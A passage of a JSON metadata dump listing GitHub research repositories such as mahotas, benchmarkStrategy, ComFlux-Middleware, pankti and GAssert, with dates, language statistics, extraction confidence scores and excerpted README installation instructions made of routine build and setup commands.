                    "value": "- Fix distribution (add missing `README.md` file)\n \n",
                    "original_header": "Version 1.4.3 (Oct 3 2016)"
                },
                "confidence": 0.9996030062889439,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "-   Add PIL based IO\n \n",
                    "original_header": "Version 1.2.4 (December 23 2014)"
                },
                "confidence": 0.9029959944597186,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "-   Explicitly set numpy.include\\_dirs() in setup.py [patch by Andrew\n    Stromnov]\n \n",
                    "original_header": "Version 1.2.1 (July 21 2014)"
                },
                "confidence": 0.9951016577073964,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "See the\n[ChangeLog](https://github.com/luispedro/mahotas/blob/master/ChangeLog)\nfor older version. \n",
                    "original_header": "1.1.0 (February 12 2014)"
                },
                "confidence": 0.9752121832242753,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2010-01-31T00:13:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-07T08:25:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 321916
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 213804
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 723
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "652": {
        "filename": "LIANGQINGYUAN_Lyra_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/LIANGQINGYUAN/Lyra",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "command: `python -m run train --param-path params.json` \n",
                    "original_header": "transformer"
                },
                "confidence": 0.9989294573304308,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/LIANGQINGYUAN/Lyra/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**training**\ncommand: `sh train_xxxx.sh` \n**testing**\ncommand: `sh test_xxxx.sh` \n",
                    "original_header": "pre-trained model"
                },
                "confidence": 0.9913002591077147,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/LIANGQINGYUAN/Lyra/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We use Pylint (https://www.pylint.org), a Python static code analysis tool, to check the code snippet. \n \n",
                    "original_header": "1.3 Quality Checking of Code Snippets"
                },
                "confidence": 0.9990104946354598,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/LIANGQINGYUAN/Lyra/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-27T02:30:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-22T01:52:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 169712
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 14108
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "653": {
        "filename": "delas_plg_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/delas/plg",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Attention:** this repository is a complete rewriting of the project already available at: https://github.com/delas/plg-old. \n",
                    "original_header": "Processes and Logs Generator"
                },
                "confidence": 0.9932395771866507,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/delas/plg/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-01-12T07:30:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-29T03:16:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 200252
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1338
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "654": {
        "filename": "martingrambow_benchmarkStrategy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/martingrambow/benchmarkStrategy",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Clone this project\n\n``` git clone https://github.com/martingrambow/benchmarkStrategy ```\n\n\n2. Install google cloud sdk\n\n```\necho \"deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main\" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list\n\nsudo apt-get install apt-transport-https ca-certificates gnupg\n\ncurl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -\n\nsudo apt-get update && sudo apt-get install google-cloud-sdk\n\ngcloud auth activate-service-account --key-file=microbenchmarkevaluation-275929759504.json\n```\n\n3. Install golang and graphviz\n\n```\nsudo apt-get install golang\n\nsudo apt-get install graphviz\n```\n\n4. Create a google cloud project\n\n- Create Service Account and download json key \n\n- activate compute engine\n\n\n5 Open Firewall (e.g., InfluxDB traffic) \n\n- (e.g., Open ports 8086, 8087, 80, and 81 in the firewall)\n\n",
                    "type": "Text_excerpt",
                    "original_header": "General setup",
                    "parent_header": [
                        "Howto run the experiments and reproduce the results (e.g., for InfluxDB):"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/martingrambow/benchmarkStrategy/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-08T08:30:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-14T08:12:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3014191
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 79966
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 326
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "655": {
        "filename": "CMU-SAFARI_SimplePIM_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/CMU-SAFARI/SimplePIM",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-16T07:15:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-14T12:55:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 155438
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 31313
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2084
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "656": {
        "filename": "ComFlux_ComFlux-Middleware_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ComFlux/ComFlux-Middleware",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Download the git repository:\n\n```\n#!sh\ngit clone https://github.com/ComFlux/ComFlux-Middleware.git\n```\n \nThe are included as submodules. The  added submodules are: uthash, kerberros, and jsonschema-c. \n\n```\n#!sh\ncd ComFlux-Middleware\ngit submodule init\ngit submodule update --recursive\n\n```\n\nInstall the middleware:\n\n```\n#!sh\ncmake [-DSSLENABLED:BOOL=ON] [-DKRBENABLED:BOOL=ON] [-DMQTTENABLED:BOOL=ON] .\nmake\nsudo make install\n\n```\n\nThe optional cmake arguments generate communication and access control modules relying on third party libraries.\n\n| Argument  | Summary |\n| :---: | ---     |\n| `-DMQTTENABLED:BOOL=ON` | Enables building two com modules relying on MQTT. |\n| `-DSSLENABLED:BOOL=ON` | Enables building an SSL com module and a certificate based access control module. |\n| `-DKRBENABLED:BOOL=ON` | Enables building a Kerberos access control module. |\n\n\nTo install mosquitto:\n\n```\n#!sh\nsudo apt-add-repository ppa:mosquitto-dev/mosquitto-ppa\nsudo apt-get update\nsudo apt-get install libmosquitto\n\n```\n\nTo install OpensSSL:\n\n```\n#!sh\nsudo apt-get install libssl-dev\n\n```\n\nThe Kerberos module uses krb5 library linked as a submodule.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ComFlux/ComFlux-Middleware/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Through the API the following headers are available: \n| File  | Summary |\n| :---: | ---     |\n| **middleware.h** | Communication and configuration functionality with the middleware core. |\n| **endpoint.h** | Endpoint definitions and endpoint specific commands. |\n| **load_mw_config.h** | To facilitate middleware deployment configuration can be applied from json structures or fles. | \n",
                    "original_header": "API structure"
                },
                "confidence": 0.9769366273549471,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ComFlux/ComFlux-Middleware/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The distribution provides the core and the library of the middleware. To compile your component run:\n```\n#!sh\n cc -o your_component your_component.c -lmiddleware_api -lmiddleware_utils\n\n```\n \n",
                    "original_header": "Compile your new component"
                },
                "confidence": 0.9358900533397553,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ComFlux/ComFlux-Middleware/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-05-25T16:02:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-02-07T10:28:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 481088
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 19313
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8711
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 2321
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "657": {
        "filename": "WSU-SEAL_ToxiCR_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WSU-SEAL/ToxiCR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-02-13T01:07:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-15T03:40:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 75531
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "658": {
        "filename": "castor-software_decompilercmp_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/decompilercmp",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-06-12T11:19:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-14T10:16:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 353169
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 168952
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "659": {
        "filename": "AmadeusBugProject_artifact_detection_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/AmadeusBugProject/artifact_detection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-09-21T12:58:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-14T10:01:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 96243
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 4315
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "660": {
        "filename": "castor-software_pankti_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/pankti",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Clone this repository\n2. `cd /path/to/pankti/pankti-extract/`\n3. `mvn clean install`\n4. `java -jar target/pankti-extract-<version>-jar-with-dependencies.jar /path/to/maven/project`\n  - Available flags: `-h` (`--help`) for usage, `-v` (`--void`) to include methods that return void\n5. The output is a CSV file at `/path/to/pankti/pankti-extract/` called _extracted-methods-\\<project-name\\>.csv_.\n6. Generate Descartes report(s) to find pseudo-tested methods in the project (we use the `method.json` files)\n  - [pitest-descartes on GitHub](https://github.com/STAMP-project/pitest-descartes)\n  - [pitest-descartes for multi-module projects](https://github.com/STAMP-project/pitmp-maven-plugin)\n7. `python find-pseudo-tested.py /path/to/method/list/from/step5.csv /space/separated/paths/to/descartes/method.json` outputs a CSV with the list of methods that are candidates for instrumentation.\n___\n \n",
                    "original_header": "Extract (pankti-extract)"
                },
                "confidence": 0.9999613362449221,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/pankti/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To run **pankti-instrument**,\n1. `cd /path/to/pankti/pankti-instrument/`\n2. `python instrument.py <path/to/instrumentation/candidates/from/previous/phase>.csv`\n3. New aspect classes for these methods are generated in `se.kth.castor.pankti.instrument.plugins`. These aspect classes are also included in `./src/main/resources/META-INF/glowroot.plugin.json`\n4. `mvn clean install`\n5. Drop `<pankti-instrument-<version>-jar-with-dependencies.jar` to `/path/to/glowroot/plugins/` \n___\n \n",
                    "original_header": "Instrument (pankti-instrument)"
                },
                "confidence": 0.9999999999772058,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/pankti/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To run **pankti-generate**,\n1. `cd /path/to/pankti/pankti-generate/`\n2. `mvn clean install`\n3. `java -jar target/pankti-generate-<version>-jar-with-dependencies.jar /path/to/project /path/to/invoked/methods.csv /path/to/directory/with/objects/` \n<p align=\"center\">\n  <img src=\"https://github.com/castor-software/pankti/blob/master/pankti-workflow.jpg\">\n</p>\n \n",
                    "original_header": "Generate (pankti-generate)"
                },
                "confidence": 0.9982887693440337,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/pankti/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Clone this repository\n2. `cd pankti/`\n3. `mvn clean install`\n--- \n",
                    "original_header": "Building"
                },
                "confidence": 0.9999962576155678,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/pankti/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-03-20T10:41:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T18:21:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1469306
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 45033
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 22541
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 2303
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 1525
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 260
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "661": {
        "filename": "liu906_HITL-Online-Just-in-Time-Defect-Prediction_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/liu906/HITL-Online-Just-in-Time-Defect-Prediction",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-03T10:20:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-17T02:24:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 54819599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2959976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 123972
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "662": {
        "filename": "jacopotagliabue_dag-card-is-the-new-model-card_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jacopotagliabue/dag-card-is-the-new-model-card",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-03-04T01:04:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-20T18:48:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 19692
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 9332
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 2741
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2665
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "663": {
        "filename": "castor-software_core-83_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/core-83",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-09-04T14:40:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-24T08:32:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 371011
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 15046
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TSQL",
                    "name": "TSQL",
                    "type": "Programming_language",
                    "size": 4223
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2037
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "664": {
        "filename": "amirhosseinzlf_STARLA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/amirhosseinzlf/STARLA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "NOTE:TensorFlow 1.X is no longer supported by Google Colab. It is recommended that you create your own virtual environment with Python 3.7 and install the necessary requirements.\n \n",
                    "original_header": "RQ3. Can we learn accurate rules to characterize the faulty episodes of RL agents?"
                },
                "confidence": 0.9999984634657874,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/amirhosseinzlf/STARLA/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-04-08T15:19:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-30T11:18:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 15620526
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "665": {
        "filename": "valerio-terragni_gassert_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/valerio-terragni/gassert",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "![](https://valerio65.github.io/assets/img/gassert.png )\n<center>\n\nV. Terragni, G. Jahangirova, P. Tonella, M. Pezz\u00e8.  \nUniversit\u00e0 della Svizzera italiana (USI), Lugano, Switzerland \n</center>\n\n\n\n## Requirements\n\n* \t\tJDK 1.8\n* \t \tUnix or MAC OS X operating systems\n\n\n## Installation Instructions\n\nUnzip `GAssert.zip`, please maintain the same name of the root folder `GAssert` otherwise the bash scripts will not work. All the libraries required by GAssert are already included inside the zip. \n\nFirst you need to set the `JAVA_HOME` environmental variable.\nGo inside the `scripts` folder and open `init_environment.sh`.\nYou can set the `JAVA_HOME` at line 5.\n\nFor example: `    export JAVA_HOME=\"/Library/Java/JavaVirtualMachines/jdk1.8.0_121.jdk/Contents/Home\"`\n\n> **We require JDK 1.8** because some of the libraries we used require JDK 1.8, we did not test the tool on newer/older JDKs. If you don't have JDK 1.8 installed on your computer, you can download it for free from here [https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) \n\nThen, you need to instrument the JDK for [DAIKON](https://plse.cs.washington.edu/daikon/).\nFrom the command line change directory :\n\n\tcd libs/daikon-5.7.2/java\n\t\nbe sure that in the command line the variable `JAVA_HOME` is properly set. You can set the variable like you did in the script:\n\n\texport JAVA_HOME=\"/Library/Java/JavaVirtualMachines/jdk1.8.0_121.jdk/Contents/Home\"\n\n\t\ninstrument the JDK like this\n\n\tmake dcomp_rt.jar\n\nafter few minutes you should see the following output\n\n\tProcessed 20500/20690 classes at Thu Jun 04 15:33:29 CEST 2020\n\tProcessed 20600/20690 classes at Thu Jun 04 15:33:30 CEST 2020\n\tFound 15635 statics\n\tWriting all classes to dcomp-rt/java/lang/jdk_classes.txt\n\tNo methods were skipped.\n\tdone at Thu Jun 04 15:33:32 CEST 2020\n\tjar cmf dcomp-rt/META-INF/MANIFEST.MF dcomp_rt.jar -C dcomp-rt .\n\nIf you have problem to compile [DAIKON](https://plse.cs.washington.edu/daikon/), please refer to the [troubleshooting of Daikon](https://plse.cs.washington.edu/daikon/download/doc/daikon.html#Troubleshooting)\n\n\n## Test Your Installation (basic usage example)\n\nTo test your installation, you can run GASSERT on one of our subjects. Go inside the scripts folder and invoke the script ` ./run_gassert.sh`. The scripts takes in input 4 parameters\n\n* TOOL (it can be either GASSERT, RANDOM or DAIKON)\n* subjectFolder (the folder name of the subject inside the subjects folder)\n* timeBudget (in minutes for the oracle improvement, a reasonable time budget is not less than 10 minutes)\n* fileNameAssertionInInput (the name of the file inside the subject's `input-assertions` folder)\n\nFor example:\n\n\t cd GAssert/scripts\n\t ./run_gassert.sh GASSERT simple-examples_getMin 10 human.assertions\n\nIt will run GASSERT for our running example (see Section 3.1 in the paper).\nMore specifically, it runs GASSERT for the subject `subjects\\simple-examples_getMin`, which refers to a method that returns the minimum between two integers.\nGASSERT will run with a time budget of 10 minutes and with the assertion in input found in the file `subjects\\simple-examples_getMin\\input-assertions\\human.assertions` (i.e., `assert(result > b)'). \n\nThe run will comprise of three phases: collection of the initial correct and incorrect states (PHASE 1), the oracle improvement process (PHASE 2), and the evaluation of the resulting assertion (PHASE 3).\n\n***\n### Phase 1 - collection of the initial correct and incorrect states\n\nNote that the time budget refers only to the evolutionary process, it excludes the time spent for Phase 1, which may take from 10 to 20 minutes.\nThis phase will use [Randoop](https://randoop.github.io/randoop/) to generate the validation tests and [Evosuite](https://github.com/EvoSuite/evosuite) to generate the initial tests.\nThe script executes the initial tests with a version of the method under test without the assertion, to collect a set of correct states.\nThen the initial tests will be executed on mutants generated by [Major](http://mutation-testing.org/downloads/) to collect the initial set of incorrect states. Finally, [DAIKON](https://plse.cs.washington.edu/daikon/) will generate an invariant for the assertion point, which can be used as an input of GAssert.\n\nWe now describe in details the behaviour of the script and the expected behaviour for Phase 1.\n\n\nIf the setup is correct, you should see the following output\n\n\tgenerating the initial sets of correct and incorrect states   \n\t- Use Randoop to generate Tests for class: SimpleMethods.java seed:    \n\tPUBLIC MEMBERS=7   \n\tExplorer = ForwardGenerator(allSequences:0, sideEffectFreeMethods:1119, subsumed_sequences:0, runtimePrimitivesSeen:38)\n\nThen Randoop will execute 10 times obtaining a maximum number of 1000 tests for the validation. You should find the generated tests inside `subjects\\simple-examples_getMin\\randoop-evaluation-tests`\n\nThen [Major](http://mutation-testing.org/downloads/) will generate a series of mutants for the method under test\n\n\t- Use Major to generate Mutants for class SimpleMethods.java\n\nYou should find the mutants of the method under tests in the folder `subjects\\simple-examples_getMin\\initial-mutations`\n\n\nThen [Evosuite](https://github.com/EvoSuite/evosuite) will run 10 times to generate additional tests\n\n\t- Use Evosuite to generate Tests for class: SimpleMethods.java LATEST VERSION\n\t* 